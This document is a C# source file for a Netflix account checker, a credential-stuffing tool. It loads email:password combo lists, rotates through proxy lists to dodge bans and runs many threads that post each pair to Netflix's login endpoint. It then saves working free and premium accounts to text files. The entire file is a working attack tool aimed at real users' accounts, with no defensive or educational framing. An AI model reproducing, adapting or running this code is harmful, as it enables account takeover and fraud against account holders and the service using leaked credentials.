using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Text;
using System.Net;
using System.Text.RegularExpressions;
using System.IO;

namespace netlfixaccountchecker
{
    
    class ProxyApi
    {
        List<KeyValuePair<string, bool>> proxyList = new List<KeyValuePair<string, bool>>();
        Random rnd = new Random();
        readonly object _object = new object();
        int minimal = 0;

        public ProxyApi(string filePath, double minimalPrcnt=5)
        {
            var tmp = File.ReadAllLines(filePath);
            foreach(var item in tmp)
            {
                proxyList.Add(new KeyValuePair<string, bool>(item, true));
            }
            minimal = (int)(proxyList.Count * (5 / (double)100));
        }
        
        public int Remaining
        {
            get
            {
                return proxyList.Count;
            }
        }
        
        public string GetRandomProxy()
        {
            lock (this)
            {
                try
                {
                    var tmp = rnd.Next(proxyList.Count);
                    var proxyChoice = proxyList[tmp].Key;
                    if (proxyList[tmp].Value)
                    {
                        proxyList[tmp] = new KeyValuePair<string, bool>(proxyChoice, false);
                        return proxyChoice;
                    }
                    else
                    {
                        return GetRandomProxy();
                    }
                }
                catch (System.InvalidOperationException)
                {
                    return GetRandomProxy();
                }
            }
        }

        public void UnusedProxy(string proxy)
        {
            lock(this)
            {
                for(int i = 0; i < proxyList.Count; i++)
                {
                    if(proxyList[i].Key == proxy)
                    {
                        proxyList[i] = new KeyValuePair<string, bool>(proxy, true);
                    }
                }
            }
        }

        public void TimeoutBanProxy(string proxy)
        {
            if(proxyList.Count > minimal)
            {
                proxyList.Remove(new KeyValuePair<string, bool>(proxy, true));
                proxyList.Remove(new KeyValuePair<string, bool>(proxy, false));
            }
        }

    }

    class CombolistApi
    {

        List<Tuple<string, string>> comboList = new List<Tuple<string, string>>();
        Random rnd = new Random();

        public CombolistApi(string filePath)
        {
            var buf = new List<string>(File.ReadAllLines(filePath));
            for (int i = 0; i < buf.Count; i++)
            {
                var emailmdp = buf[i].Split(new char[] { ':' }, 2);
                if(emailmdp.Count() >= 2)
                {
                    comboList.Add(new Tuple<string, string>(emailmdp[0], emailmdp[1]));
                }
            }
        }

        public bool StillCombo()
        {
            return comboList.Count != 0;
        }

        public Tuple<string, string> GetComboRandom()
        {
            if(StillCombo())
            {
                var buf = rnd.Next(comboList.Count);
                var choice = comboList[buf];
                comboList.RemoveAt(buf);
                return choice;
            }
            return new Tuple<string, string>("", "");
        }

    }

    class NetflixClient
    {

        CookieContainer clientCookies = new CookieContainer();

        public enum LoginStatus
        {
            TIMEOUTBAN,
            CONNECT_FREE,
            CONNECT_PREMIUM,
            INVALID
        }

        void parseCookieInHeader(WebHeaderCollection header)
        {
            var cookies = header.GetValues("set-cookie");
            for (UInt16 i = 0; i < cookies.Count(); i++)
            {
                Match match = Regex.Match(cookies[i], "(.+?)=(.+?);");
                //Console.WriteLine("Name cookie : {0}\nValue cookie : {1}", match.Groups[1].Value, match.Groups[2].Value);
                clientCookies.Add(new Cookie(match.Groups[1].Value, match.Groups[2].Value, "/", ".netflix.com"));
            }
        }

        public NetflixClient()
        {
            
        }

        public bool CreateSession(string proxy = "")
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://www.netflix.com/fr/");
            request.Method = "GET";
            request.UserAgent = "My Protection";
            request.Timeout = 20 * 1000;
            request.ContinueTimeout = 20 * 1000;
            request.ReadWriteTimeout = 20 * 1000;
            if (proxy != "")
            {
                request.Proxy = new WebProxy(proxy, false);
            }
            HttpWebResponse response = null;
            try
            {
                var buf = request.GetResponseAsync();
                if(buf.Wait(20 * 1000))
                {
                    response = (HttpWebResponse)buf.Result;
                }
                else
                {
                    return false;
                }
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.Timeout || e.Status == WebExceptionStatus.ConnectFailure || e.Status == WebExceptionStatus.ProtocolError)
                {
                    return false;
                }
                return false;
            }
            catch (AggregateException e)
            {
                return false;
            }
            if (response.Headers.GetValues("set-cookie").Count() == 0)
            {
                Console.WriteLine("err");
                return false;
            }
            parseCookieInHeader(response.Headers);

            return true;
        }

        public LoginStatus Login(string email, string mdp, string proxy = "")
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://api-global.netflix.com/account/auth");
            byte[] data = Encoding.ASCII.GetBytes("email=" + email + "&password=" + mdp);
            request.Method = "POST";
            request.UserAgent = "My Protection";
            request.Timeout = 20 * 1000;
            request.ContinueTimeout = 20 * 1000;
            request.ReadWriteTimeout = 20 * 1000;
            request.CookieContainer = clientCookies;
            request.ContentLength = data.Length;
            if(proxy != "")
            {
                request.Proxy = new WebProxy(proxy);
            }
            try
            {
                var dataStream = request.GetRequestStreamAsync();
                if(dataStream.Wait(20 * 1000))
                {
                    dataStream.Result.Write(data, 0, data.Length);
                    dataStream.Result.Close();
                }
                else
                {
                    return LoginStatus.TIMEOUTBAN;
                }
            }
            catch (System.Net.WebException e)
            {
                if (e.Status == WebExceptionStatus.Timeout || e.Status == WebExceptionStatus.ConnectFailure || e.Status == WebExceptionStatus.ProtocolError)
                {
                    return LoginStatus.TIMEOUTBAN;
                }
            }
            catch (AggregateException e)
            {
                return LoginStatus.TIMEOUTBAN;
            }
            catch
            {
                return LoginStatus.TIMEOUTBAN;
            }
            HttpWebResponse response = null;
            try
            {
                response = (HttpWebResponse)request.GetResponse();
            }
            catch (System.Net.WebException e)
            {
                HttpStatusCode statusCode = HttpStatusCode.OK;
                if (e.Response != null)
                {
                    statusCode = ((HttpWebResponse)e.Response).StatusCode;
                }
                if (e.Status == WebExceptionStatus.Timeout || e.Status == WebExceptionStatus.ConnectFailure || statusCode == HttpStatusCode.Forbidden)
                {
                    return LoginStatus.TIMEOUTBAN;
                }
                else if (statusCode == HttpStatusCode.Unauthorized && e.Response != null)
                {
                    if (new StreamReader(e.Response.GetResponseStream()).ReadToEnd().Contains("Incorrect email address or password."))
                    {
                        return LoginStatus.INVALID;
                    }
                }
                return LoginStatus.TIMEOUTBAN;
            }
            string strResponse = new StreamReader(response.GetResponseStream()).ReadToEnd();
            if (strResponse.Contains("NEVER_MEMBER"))
            {
                return LoginStatus.CONNECT_FREE;
            }
            else if (strResponse.Contains("CURRENT_MEMBER"))
            {
                return LoginStatus.CONNECT_PREMIUM;
            }
            else
            {
                return LoginStatus.TIMEOUTBAN;
            }
        }

    }

    class Program
    {


        static ProxyApi proxyList = null;
        static CombolistApi comboList = null;
        static NetflixClient client = new NetflixClient();

        static long nbTested = 0;
        static long nbHitF = 0;
        static long nbHitP = 0;
        static long activeThread = 0;
        static int nbThreads;

        static long totalNbHit
        {
            get
            {
                return nbHitF + nbHitP;
            }
        }

        public static void AccountChecker()
        {
            string proxyChoice = proxyList.GetRandomProxy();
            bool haveServedProxy = false;
            bool threadStart = false;
            while (comboList.StillCombo())
            {
                var emailmdp = comboList.GetComboRandom();
                bool isTested = false;
                while(!isTested && emailmdp != null)
                {
                    if(activeThread < nbThreads)
                    {
                        NetflixClient.LoginStatus response = NetflixClient.LoginStatus.TIMEOUTBAN;
                        response = client.Login(emailmdp.Item1, emailmdp.Item2, proxyChoice);
                        if (response == NetflixClient.LoginStatus.TIMEOUTBAN)
                        {
                            if (threadStart)
                            {
                                activeThread--;
                                threadStart = false;
                            }
                            if (!haveServedProxy)
                            {
                                //Console.WriteLine("TIMEOUT/BAN PROXY REMAINING : {0}", proxyList.Remaining);
                                proxyList.TimeoutBanProxy(proxyChoice);
                            }
                            proxyList.UnusedProxy(proxyChoice);
                            proxyChoice = proxyList.GetRandomProxy();
                            haveServedProxy = false;
                        }
                        isTested = response != NetflixClient.LoginStatus.TIMEOUTBAN;
                        if (response == NetflixClient.LoginStatus.CONNECT_FREE || response == NetflixClient.LoginStatus.CONNECT_PREMIUM)
                        {
                            //Console.WriteLine(response == NetflixClient.LoginStatus.CONNECT_FREE ? "CONNECT SUCCESS FREE : {0}:{1}" : "CONNECT SUCCESS PREMIUM : {0}:{1}", emailmdp.Item1, emailmdp.Item2);
                            if (response == NetflixClient.LoginStatus.CONNECT_FREE)
                            {
                                nbHitF++;
                            }
                            else if (response == NetflixClient.LoginStatus.CONNECT_PREMIUM)
                            {
                                nbHitP++;
                            }
                            try
                            {
                                File.AppendAllLines(response == NetflixClient.LoginStatus.CONNECT_FREE ? "FIND NETFLIX.txt" : "FIND NETFLIX PREM.txt", new string[] { emailmdp.Item1 + ":" + emailmdp.Item2 });
                            }
                            catch (System.IO.IOException e)
                            {
                                Console.WriteLine("WRITE FILE ERROR : ");
                                for (int i = 0; i < e.Data.Count; i++)
                                {
                                    var buf = e.Data[i];
                                }
                            }
                        }
                        else if (response == NetflixClient.LoginStatus.INVALID)
                        {
                            //Console.WriteLine("TESTED : {0}:{1}", emailmdp.Item1, emailmdp.Item2);
                        }
                    }
                    else
                    {
                        Thread.Sleep(1000);
                    }
                }
                haveServedProxy = true;
                if(!threadStart)
                {
                    activeThread++;
                    threadStart = true;
                }
                nbTested++;
                Thread.Sleep(2500);
            }
            activeThread--;
        }



        static void Main(string[] args)
        {

            
            if(!client.CreateSession())
            {
                Console.WriteLine("ERROR");
                return;
            }

            Console.Write("COMBO LIST (email:password) : ");
            comboList = new CombolistApi(Console.In.ReadLine());
            Console.Write("PROXY LIST (ip:port) : ");
            proxyList = new ProxyApi(Console.In.ReadLine());
            Console.Write("NUMBER THREADS : ");
            nbThreads = int.Parse(Console.In.ReadLine());

            Thread[] threads = new Thread[nbThreads];

            for(int i = 0; i < threads.Count(); i++)
            {
                threads[i] = new Thread(AccountChecker);
                threads[i].Start();
            }

            var start = DateTime.Now.Ticks;
            var sleep = 0.2;
            for (; ; )
            {
                long elapsed = DateTime.Now.Ticks - start;
                double testPerSecond = 0;
                double findPerSecond = 0;
                if (elapsed != 0)
                {
                    testPerSecond = (nbTested / (double)elapsed) * 10000000;
                    findPerSecond = (totalNbHit / (double)elapsed) * 10000000;
                }
                Console.Write("TESTED : {0} | FIND : {1} | FREE : {2}; PREMIUM : {3} | THREAD ACTIVE : {4} | TEST PER SECOND : {5} | FIND PER SECOND : {6} | PROXY REMAINING : {7}               \r", nbTested, totalNbHit, nbHitF, nbHitP, activeThread, testPerSecond, findPerSecond, proxyList.Remaining);
                Thread.Sleep((int)(sleep * 1000));
            }

            Console.WriteLine("FINISH");
            Console.In.Read();
        }
    }
}
